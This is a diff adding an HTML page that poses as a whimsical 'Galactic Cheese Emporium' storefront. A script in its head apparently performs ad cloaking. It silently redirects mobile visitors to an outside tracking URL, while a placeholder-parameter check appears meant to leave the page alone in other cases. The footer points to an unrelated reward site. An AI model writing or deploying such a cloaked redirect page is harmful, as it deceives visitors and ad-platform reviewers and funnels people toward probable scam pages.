@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/dade2563-43ce-4351-9ba3-22961c539221?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Galactic Cheese Emporium</title>
+    <style>
+        body {
+            font-family: 'Comic Sans MS', cursive;
+            background: linear-gradient(45deg, #ff00ff, #00ffff);
+            color: #333;
+            margin: 0;
+            padding: 0;
+        }
+        header {
+            background-color: #ff9900;
+            padding: 20px;
+            text-align: center;
+        }
+        main {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-around;
+            padding: 20px;
+        }
+        .cheese-card {
+            background-color: rgba(255, 255, 255, 0.8);
+            border-radius: 15px;
+            padding: 15px;
+            margin: 10px;
+            width: 200px;
+            text-align: center;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
+        }
+        footer {
+            background-color: #333;
+            color: white;
+            text-align: center;
+            padding: 10px;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+        a {
+            color: #00ff00;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>🧀 Galactic Cheese Emporium 🚀</h1>
+    </header>
+    <main>
+        <div class="cheese-card">
+            <h2>Moon Cheddar</h2>
+            <p>Out of this world flavor!</p>
+        </div>
+        <div class="cheese-card">
+            <h2>Martian Mozzarella</h2>
+            <p>Stretchy and red-tinted!</p>
+        </div>
+        <div class="cheese-card">
+            <h2>Asteroid Gouda</h2>
+            <p>Packed with cosmic goodness!</p>
+        </div>
+    </main>
+    <footer>
+        <p>© 2023 Galactic Cheese Emporium | <a href="https://tokreward.com/privacy.html">Privacy Policy</a></p>
+    </footer>
+</body>
+</html>
